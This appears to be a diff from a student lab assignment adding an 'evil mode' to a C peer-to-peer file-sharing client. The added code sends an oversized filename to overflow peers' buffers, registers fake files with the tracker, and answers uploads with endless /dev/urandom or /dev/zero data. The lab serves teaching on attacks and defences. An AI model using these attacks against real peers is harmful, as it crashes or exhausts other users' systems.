@@ -40,6 +40,7 @@ static int listen_port;
 				// 32768 = 4096 * 8 
 #define FILENAMESIZ	256	// Size of task_t::filename
 #define MAXFILESIZ	2097152 // 2*1024*1024
+#define OVERFLOW	"EGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERTEGGERT"
 
 typedef enum tasktype {		// Which type of connection is this?
 	TASK_TRACKER,		// => Tracker connection
@@ -404,12 +405,30 @@ static void register_files(task_t *tracker_task, const char *myalias)
 	message("* Tracker's response to our IP address registration:\n%s",
 		&tracker_task->buf[messagepos]);
 	if (tracker_task->buf[messagepos] != '2') {
-		message("* The tracker reported an error, so I will not register files with it.\n");
+		message("* The tracker reported an error, so I will not \
+			register files with it.\n");
 		return;
 	}
 
 	// Register files with the tracker.
 	message("* Registering our files with tracker\n");
+
+	if (evil_mode) {
+		char* files[] = { "cat1.jpg", "cat2.jpg", "cat3.jpg" };
+		int i;
+		for (i = 1; i < 3; i = i + 1) {
+			osp2p_writef(tracker_task->peer_fd, "HAVE %s\n", 
+				files[i]);
+			messagepos = read_tracker_response(tracker_task);
+			if (tracker_task->buf[messagepos] != '2') {
+				error("* Tracker error message while \
+					registering '%s':\n%s", files[i], 
+					&tracker_task->buf[messagepos]);
+			}
+		}
+		return;
+	}
+
 	if ((dir = opendir(".")) == NULL)
 		die("open directory: %s", strerror(errno));
 	while ((ent = readdir(dir)) != NULL) {
@@ -536,7 +555,12 @@ static void task_download(task_t *t, task_t *tracker_task)
 		error("* Cannot connect to peer: %s\n", strerror(errno));
 		goto try_again;
 	}
-	osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
+
+	if (evil_mode) {
+		message("Initiating download of big file...\n");
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", OVERFLOW);
+	} else
+		osp2p_writef(t->peer_fd, "GET %s OSP2P\n", t->filename);
 
 	// Open disk file for the result.
 	// If the filename already exists, save the file in a name like
@@ -582,6 +606,7 @@ static void task_download(task_t *t, task_t *tracker_task)
 
 		ret = write_from_taskbuf(t->disk_fd, t);
 
+		message("** Checking total bytes written\n");
 		if (t->total_written > MAXFILESIZ) {
                         error("* File reached size limit");
                         goto try_again;
@@ -676,11 +701,19 @@ static void task_upload(task_t *t)
 	}
 	t->head = t->tail = 0;
 
+	if (evil_mode) {
+                message("** Requested %s\n", t->filename);
+                if (strstr(t->filename, "cat"))
+                        strcpy(t->filename, "/dev/urandom");
+		else
+			strcpy(t->filename, "/dev/zero");
+	}
+
 	if (strlen(t->filename) > FILENAMESIZ - 1) {
 		error("Buffer overflow avoided!\n");
 		goto exit;
 	}
-	
+
 	message("** File name is '%s'\n", t->filename);
 
 	/* Check if t->filename is in the current directory. */
@@ -691,7 +724,8 @@ static void task_upload(task_t *t)
 		char* home = getenv("HOME");
 		char homePath[PATH_MAX];
 		strcpy(homePath, home);
-		if (!realpath(strcat(homePath, t->filename + 1), filePath)) {
+		if (!realpath(strcat(homePath, t->filename + 1), 
+			filePath)) {
 			error("** Error in resolving pathname");
 			goto exit;
 		}
@@ -811,6 +845,12 @@ int main(int argc, char *argv[])
 "         -dDIR        Upload and download files from directory DIR.\n"
 "         -b[MODE]     Evil mode!!!!!!!!\n");
 		exit(0);
+	}
+
+	if (evil_mode) {
+		message("** Preparing to be evil...Bwhaha!\n");
+		myalias = (const char*) malloc(40);
+		sprintf((char*) myalias, "Evil Eggert");
 	}
 
 	// Connect to the tracker and register our files.
